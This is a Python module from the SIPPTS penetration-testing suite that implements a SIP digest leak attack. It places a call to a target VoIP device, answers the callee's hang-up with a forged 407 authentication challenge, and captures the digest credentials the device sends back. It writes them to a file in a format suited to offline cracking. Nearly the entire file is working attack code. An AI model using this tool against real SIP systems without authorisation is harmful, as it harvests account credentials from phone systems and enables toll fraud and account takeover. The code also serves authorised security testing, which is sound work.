#!/usr/bin/env python3
# -*- coding: utf-8 -*-

__author__ = 'Jose Luis Verdeguer'
__version__ = '3.0.0'
__license__ = "GPL"
__copyright__ = "Copyright (C) 2015-2022, SIPPTS"
__email__ = "pepeluxx@gmail.com"

import socket
import sys
import ssl
import ipaddress
import re
from tabnanny import verbose
from lib.functions import create_message, create_response_error, create_response_ok, parse_message, parse_digest, generate_random_string, get_machine_default_ip, ip2long, get_free_port, calculateHash

BRED = '\033[1;31;40m'
RED = '\033[0;31;40m'
BRED_BLACK = '\033[1;30;41m'
RED_BLACK = '\033[0;30;41m'
BGREEN = '\033[1;32;40m'
GREEN = '\033[0;32;40m'
BGREEN_BLACK = '\033[1;30;42m'
GREEN_BLACK = '\033[0;30;42m'
BYELLOW = '\033[1;33;40m'
YELLOW = '\033[0;33;40m'
BBLUE = '\033[1;34;40m'
BLUE = '\033[0;34;40m'
BMAGENTA = '\033[1;35;40m'
MAGENTA = '\033[0;35;40m'
BCYAN = '\033[1;36;40m'
CYAN = '\033[0;36;40m'
BWHITE = '\033[1;37;40m'
WHITE = '\033[0;37;40m'


class SipDigestLeak:
    def __init__(self):
        self.ip = ''
        self.rport = '5060'
        self.proto = 'UDP'
        self.domain = ''
        self.contact_domain = ''
        self.from_user = '100'
        self.from_name = ''
        self.from_domain = ''
        self.to_user = '100'
        self.to_name = ''
        self.to_domain = ''
        self.user_agent = 'pplsip'
        self.ofile = ''
        self.user = ''
        self.pwd = ''
        self.verbose = 0

    def start(self):
        supported_protos = ['UDP', 'TCP', 'TLS']

        self.proto = self.proto.upper()

        # check protocol
        if self.proto not in supported_protos:
            print(BRED + 'Protocol %s is not supported' % self.proto)
            sys.exit()

        # if rport is by default but we want to scan TLS protocol, use port 5061
        if self.rport == 5060 and self.proto == 'TLS':
            self.rport = 5061

        print(BWHITE + '[!] Target: ' + GREEN + '%s:%s/%s' %
              (self.ip, self.rport, self.proto))
        print(BWHITE + '[!] Caller: ' + GREEN + '%s' % self.from_user)
        print(BWHITE + '[!] Callee: ' + GREEN + '%s' % self.to_user)
        print(WHITE)

        self.call(self.ip, self.rport, self.proto)

    def call(self, ip, port, proto):
        cseq = '1'

        # my IP address
        local_ip = get_machine_default_ip()

        # SIP headers
        if self.domain == '':
            self.domain = ip
        if self.from_domain == '':
            self.from_domain = ip
        if self.to_domain == '':
            self.to_domain = ip
        if self.contact_domain == '':
            self.contact_domain = local_ip

        try:
            if self.proto == 'UDP':
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        except socket.error:
            print(RED+'Failed to create socket')
            sys.exit(1)

        bind = '0.0.0.0'
        lport = 5060

        try:
            sock.bind((bind, lport))
        except:
            lport = get_free_port()
            sock.bind((bind, lport))

        host = (str(ip), int(port))

        branch = generate_random_string(71, 71, 'ascii')
        callid = generate_random_string(32, 32, 'hex')
        tag = generate_random_string(8, 8, 'hex')

        msg = create_message('INVITE', self.contact_domain, self.from_user, self.from_name, self.from_domain,
                             self.to_user, self.to_name, self.to_domain, proto, self.domain, self.user_agent, lport, branch, callid, tag, cseq, '', '', 1, '', 0, '', '')

        print(YELLOW + '[=>] Request INVITE' + WHITE)

        if self.verbose == 1:
            print(BWHITE + '[+] Sending to %s:%s/%s ...' %
                  (self.ip, self.rport, self.proto))
            print(YELLOW + msg + WHITE)

        try:
            sock.settimeout(15)

            # send INVITE
            if proto == 'TCP':
                sock.connect(host)

            if self.proto == 'TLS':
                sock_ssl = ssl.wrap_socket(
                    sock, ssl_version=ssl.PROTOCOL_TLS, ciphers=None, cert_reqs=ssl.CERT_NONE)
                sock_ssl.connect(host)
                sock_ssl.sendall(bytes(msg[:8192], 'utf-8'))
            else:
                sock.sendto(bytes(msg[:8192], 'utf-8'), host)

            rescode = '100'

            while rescode[:1] == '1':
                # receive temporary code
                if self.proto == 'TLS':
                    resp = sock_ssl.recv(4096)
                else:
                    resp = sock.recv(4096)

                headers = parse_message(resp.decode())

                if headers:
                    via = headers['via']
                    rr = headers['rr']

                    response = '%s %s' % (
                        headers['response_code'], headers['response_text'])
                    rescode = headers['response_code']
                    print(CYAN + '[<=] Response %s' % response)

                    totag = headers['totag']

                if self.verbose == 1:
                    print(BWHITE + '[+] Receiving from %s:%s/%s ...' %
                          (self.ip, self.rport, self.proto))
                    print(GREEN + resp.decode() + WHITE)

            if self.user != '' and self.pwd != '' and (headers['response_code'] == '401' or headers['response_code'] == '407'):
                # send ACK
                print(YELLOW + '[+] Request ACK')
                msg = create_message('ACK', self.contact_domain, self.from_user, self.from_name, self.from_domain,
                                     self.to_user, self.to_name, self.to_domain, proto, self.domain, self.user_agent, lport, branch, callid, tag, cseq, totag, '', 1, '', 0, via, rr)

                if self.verbose == 1:
                    print(BWHITE + '[+] Sending to %s:%s/%s ...' %
                          (self.ip, self.rport, self.proto))
                    print(YELLOW + msg + WHITE)

                if self.proto == 'TLS':
                    sock_ssl.sendall(bytes(msg[:8192], 'utf-8'))
                else:
                    sock.sendto(bytes(msg[:8192], 'utf-8'), host)

                if headers['auth'] != '':
                    auth = headers['auth']
                    auth_type = headers['auth-type']
                    headers = parse_digest(auth)
                    realm = headers['realm']
                    nonce = headers['nonce']
                    uri = 'sip:%s@%s' % (self.to_user, self.domain)
                    algorithm = headers['algorithm']
                    cnonce = headers['cnonce']
                    nc = headers['nc']
                    qop = headers['qop']

                    if qop != '' and cnonce == '':
                        cnonce = generate_random_string(8, 8, 'ascii')
                    if qop != '' and nc == '':
                        nc = '00000001'

                    response = calculateHash(
                        self.user, realm, self.pwd, 'INVITE', uri, nonce, algorithm, cnonce, nc, qop, 0, '')

                    digest = 'Digest username="%s", realm="%s", nonce="%s", uri="%s", response="%s", algorithm=%s' % (
                        self.user, realm, nonce, uri, response, algorithm)
                    if qop != '':
                        digest += ', qop=%s' % qop
                    if cnonce != '':
                        digest += ', cnonce="%s"' % cnonce
                    if nc != '':
                        digest += ', nc=%s' % nc

                    branch = generate_random_string(71, 71, 'ascii')
                    cseq = str(int(cseq) + 1)

                    print(YELLOW + '[=>] Request INVITE' + WHITE)

                    msg = create_message('INVITE', self.contact_domain, self.from_user, self.from_name, self.from_domain, self.to_user, self.to_name, self.to_domain, self.proto,
                                         self.domain, self.user_agent, lport, branch, callid, tag, cseq, '', digest, auth_type, '', 0, via, '')

                    if self.verbose == 1:
                        print(BWHITE + '[+] Sending to %s:%s/%s ...' %
                              (self.ip, self.rport, self.proto))
                        print(YELLOW + msg + WHITE)

                    try:
                        if self.proto == 'TLS':
                            sock_ssl.sendall(bytes(msg[:8192], 'utf-8'))
                        else:
                            sock.sendto(bytes(msg[:8192], 'utf-8'), host)

                        rescode = '100'

                        while rescode[:1] == '1':
                            # receive temporary code
                            if self.proto == 'TLS':
                                resp = sock_ssl.recv(4096)
                            else:
                                resp = sock.recv(4096)

                            headers = parse_message(resp.decode())

                            if headers:
                                rr = headers['rr']

                                response = '%s %s' % (
                                    headers['response_code'], headers['response_text'])
                                rescode = headers['response_code']

                                print(CYAN + '[<=] Response %s' % response)
                                if self.verbose == 1:
                                    print(BWHITE + '[+] Receiving from %s:%s/%s ...' %
                                          (self.ip, self.rport, self.proto))
                                    print(GREEN + resp.decode() + WHITE)
                    except:
                        print(WHITE)

            # receive 200 Ok - call answered
            if headers['response_code'] == '200':
                cuser = headers['contactuser']
                cdomain = headers['contactdomain']
                if cdomain == '':
                    cdomain = self.domain
                else:
                    if cuser != None and cuser != '':
                        cdomain = cuser + '@' + cdomain

                totag = headers['totag']

                # send ACK
                print(YELLOW + '[=>] Request ACK')

                msg = create_message('ACK', self.contact_domain, self.from_user, self.from_name, self.from_domain,
                                     self.to_user, self.to_name, self.to_domain, proto, cdomain, self.user_agent, lport, branch, callid, tag, cseq, totag, digest, auth_type, '', 0, via, rr)

                if self.verbose == 1:
                    print(BWHITE + '[+] Sending to %s:%s/%s ...' %
                          (self.ip, self.rport, self.proto))
                    print(YELLOW + msg + WHITE)

                if self.proto == 'TLS':
                    sock_ssl.sendall(bytes(msg[:8192], 'utf-8'))
                else:
                    sock.sendto(bytes(msg[:8192], 'utf-8'), host)

                # wait for BYE
                bye = False
                while bye == False:
                    print(WHITE + '\t... waiting for BYE ...')

                    if self.proto == 'TLS':
                        resp = sock_ssl.recv(4096)
                    else:
                        resp = sock.recv(4096)

                    if resp.decode()[0:3] == 'BYE':
                        bye = True
                        print(CYAN + '[<=] Received BYE')
                        headers = parse_message(resp.decode())
                        branch = headers['branch']
                        cseq = headers['cseq']
                        via = headers['via']
                    else:
                        print(CYAN + '[<=] Response %s' % response)

                    if self.verbose == 1:
                        print(BWHITE + '[+] Receiving from %s:%s/%s ...' %
                              (self.ip, self.rport, self.proto))
                        print(GREEN + resp.decode() + WHITE)

                # send 407 with digest
                cseq = int(cseq) + 1
                msg = create_response_error('407 Proxy Authentication Required', self.from_user,
                                            self.to_user, proto, self.domain, lport, cseq, 'BYE', branch, callid, tag, totag, local_ip, via)

                print(
                    YELLOW + '[=>] Request 407 Proxy Authentication Required')

                if self.verbose == 1:
                    print(BWHITE + '[+] Sending to %s:%s/%s ...' %
                          (self.ip, self.rport, self.proto))
                    print(YELLOW + msg + WHITE)

                if self.proto == 'TLS':
                    sock_ssl.sendall(bytes(msg[:8192], 'utf-8'))
                else:
                    sock.sendto(bytes(msg[:8192], 'utf-8'), host)

                # receive auth BYE
                if self.proto == 'TLS':
                    resp = sock_ssl.recv(4096)
                else:
                    resp = sock.recv(4096)

                print(CYAN + '[<=] Received BYE')

                if self.verbose == 1:
                    print(BWHITE + '[+] Receiving from %s:%s/%s ...' %
                          (self.ip, self.rport, self.proto))
                    print(GREEN + resp.decode() + WHITE)

                headers = parse_message(resp.decode())
                branch = headers['branch']

                try:
                    auth = headers['auth']
                except:
                    auth = ''

                # send 200 OK
                msg = create_response_ok(
                    self.from_user, self.to_user, proto, self.domain, lport, cseq, branch, callid, tag, totag)

                print(YELLOW + '[=>] Request 200 Ok\n')

                if self.verbose == 1:
                    print(BWHITE + '[+] Sending to %s:%s/%s ...' %
                          (self.ip, self.rport, self.proto))
                    print(YELLOW + msg + WHITE)

                if self.proto == 'TLS':
                    sock_ssl.sendall(bytes(msg[:8192], 'utf-8'))
                else:
                    sock.sendto(bytes(msg[:8192], 'utf-8'), host)

                if auth != '':
                    print(BGREEN + 'Auth=%s\n' % auth + WHITE)

                    headers = parse_digest(auth)

                    if self.ofile != '':
                        data = '%s"%s"%s"%s"BYE"%s"%s"%s"%s"%s"MD5"%s' % (
                            ip, local_ip, headers['username'], headers['realm'], headers['uri'], headers['nonce'], headers['cnonce'], headers['nc'], headers['qop'], headers['response'])

                        f = open(self.ofile, 'w')
                        f.write(data)
                        f.close()

                        print(WHITE+'Auth data saved in file %s' % self.ofile)
                else:
                    print(BRED + 'No Auth Digest received :(\n' + WHITE)
        except socket.timeout:
            pass
        except:
            pass
        finally:
            sock.close()

        return
